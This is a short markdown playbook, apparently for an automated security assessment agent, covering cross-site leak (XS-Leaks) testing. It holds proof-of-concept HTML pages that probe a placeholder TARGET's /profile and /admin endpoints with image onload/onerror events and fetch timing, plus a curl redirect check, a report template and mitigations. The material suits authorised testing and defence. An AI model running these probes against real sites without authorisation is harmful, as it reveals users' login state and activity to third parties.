# XS-Leaks (Cross-Site Leaks)

## Overview
XS-Leaks use cross-site side channels (timing, redirects, resource events) to
infer sensitive data without reading it directly.

## Phase 1: Identify Cross-Site Targets
```bash
# Look for endpoints with different responses based on auth/state:
# /profile, /notifications, /messages, /admin
```

## Phase 2: Resource Event Probes
```bash
cat > /workspace/output/TARGET_xsleaks_poc.html <<'HTML'
<!doctype html>
<html>
  <body>
    <script>
      const targets = [
        "https://TARGET/profile",
        "https://TARGET/admin"
      ];

      targets.forEach(t => {
        const img = new Image();
        img.onload = () => console.log("load", t);
        img.onerror = () => console.log("error", t);
        img.src = t;
      });
    </script>
  </body>
</html>
HTML
```

## Phase 3: Timing Side-Channel
```bash
cat > /workspace/output/TARGET_xsleaks_timing.html <<'HTML'
<!doctype html>
<html>
  <body>
    <script>
      async function probe(url) {
        const start = performance.now();
        try {
          await fetch(url, { mode: "no-cors" });
        } catch (e) {}
        const end = performance.now();
        console.log(url, (end - start).toFixed(2));
      }

      probe("https://TARGET/profile");
      probe("https://TARGET/logout");
    </script>
  </body>
</html>
HTML
```

## Phase 4: Redirect-Based Leaks
```bash
# Observe redirect chains on protected endpoints
curl -s -I "https://TARGET/protected" \
  | tee /workspace/output/TARGET_xsleaks_redirects.txt
```

## Phase 5: Validation
```bash
# Confirm differences between authenticated vs unauthenticated behavior
# Record onload/onerror or timing deltas
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Cross-site resource events leak auth state
- [ ] Timing differences reveal protected content

## Evidence
- PoC: /workspace/output/TARGET_xsleaks_poc.html
- Timing: /workspace/output/TARGET_xsleaks_timing.html
- Redirects: /workspace/output/TARGET_xsleaks_redirects.txt

## Recommendations
1. Use proper cross-site protections (CSRF, SameSite cookies)
2. Reduce response differences for protected vs unprotected endpoints
3. Disable sensitive endpoints from being loaded cross-site
```

## Output Files
- `/workspace/output/TARGET_xsleaks_poc.html` — resource event PoC
- `/workspace/output/TARGET_xsleaks_timing.html` — timing PoC
- `/workspace/output/TARGET_xsleaks_redirects.txt` — redirect evidence

indicators: xs-leaks, cross-site leaks, timing attack, onload onerror, redirect leak
